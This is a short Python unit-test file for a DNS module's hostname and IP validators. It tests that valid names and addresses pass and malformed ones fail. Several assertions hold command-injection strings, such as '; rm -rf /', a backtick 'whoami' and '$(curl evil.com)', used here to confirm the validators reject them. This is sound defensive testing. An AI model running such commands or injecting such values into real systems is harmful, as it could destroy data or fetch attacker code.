from app.modules.dns.common import is_valid_hostname, is_valid_ip


def test_accepts_valid_domains():
    assert is_valid_hostname("example.com")
    assert is_valid_hostname("sub.example.co.uk")
    assert is_valid_hostname("{{BASE_DOMAIN}}")


def test_rejects_shell_metacharacters():
    assert not is_valid_hostname("example.com; rm -rf /")
    assert not is_valid_hostname("example.com`whoami`")
    assert not is_valid_hostname("$(curl evil.com)")


def test_rejects_empty_and_malformed():
    assert not is_valid_hostname("")
    assert not is_valid_hostname("-example.com")
    assert not is_valid_hostname("example..com")


def test_ip_validator():
    assert is_valid_ip("8.8.8.8")
    assert is_valid_ip("2001:4860:4860::8888")
    assert not is_valid_ip("not-an-ip")
    assert not is_valid_ip("8.8.8.8; rm -rf /")
